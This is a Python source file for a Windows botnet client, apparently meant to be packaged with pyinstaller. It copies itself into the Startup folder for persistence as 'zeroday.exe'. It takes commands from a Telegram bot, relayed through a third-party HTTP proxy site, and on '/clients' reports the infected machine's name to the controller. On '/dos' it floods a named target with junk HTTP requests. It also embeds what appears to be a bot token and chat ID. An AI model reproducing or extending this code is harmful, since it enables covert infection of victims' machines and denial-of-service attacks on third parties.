
# start

from requests import post
from bs4 import BeautifulSoup
import json
import time
from platform import node
from socket import *
from os import system

user = node()
user_1 = user.replace("-PC","")
cmd = 'copy botnet.exe "C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\zeroday.exe"'.format(user_1)
system(cmd)


def DOS(target):

		if "https" or "http" in target:
				target = target.replace("https","")
				target = target.replace("http","")

		ip = gethostbyname(target)

		n = 0
		while n < 10000:

			n +=1

			s = socket(AF_INET , SOCK_STREAM)
		
			s.connect((ip,80))

			buff = "User-Agent:"+"A"*500

			s.send("GET / HTTP/1.1\r\n"+"\n\n"+buff)

			print "[+]Sended Packet"

			s.close()

			time.sleep(4)


while True:

    time.sleep(7)

    URL = "https://api.telegram.org/bot521443916:AAHqRQqOK5tavN9pbE_nMId1Wi2S8PjtUi0/Getupdates"

    payload = {"UrlBox":URL,
                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
                }

    req = post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)

    source = req.text

    soup = BeautifulSoup(source,"html.parser")

    resualt = soup.find("div" ,  id="ResultData").text

    resualt_2 = resualt.replace("Response Content","")

    DATA = json.loads(resualt_2)["result"]

    n = 0

    while True:
        n += 1
        try:
            DATA[n]['message']['text']
        except:
            key =  DATA[n-1]['message']['text']
            break

    print "last key =",key

    last_key = key

    if last_key == "/clients":

            time.sleep(2)

            URL_1 = "https://api.telegram.org/bot521443916:AAHqRQqOK5tavN9pbE_nMId1Wi2S8PjtUi0/SendMessage?chat_id=534270076&text=online="+str(node())

            payload_1 = {"UrlBox":URL_1,
                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
                }

            post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_1)

            print "Sended message !"

            time.sleep(10)

    elif last_key[0:4] == "/dos":

            URL_2 = "https://api.telegram.org/bot521443916:AAHqRQqOK5tavN9pbE_nMId1Wi2S8PjtUi0/SendMessage?chat_id=534270076&text=ok="+str(node())

            payload_2 = {"UrlBox":URL_2,
                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
                }

            post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_2)


            target = last_key[5:]
			
			print target
			
			DOS(target)
			
			
	else:
	
			continue
			
			
# end 


# pyinstaller --noconsole -i test.icon -F botnet.py














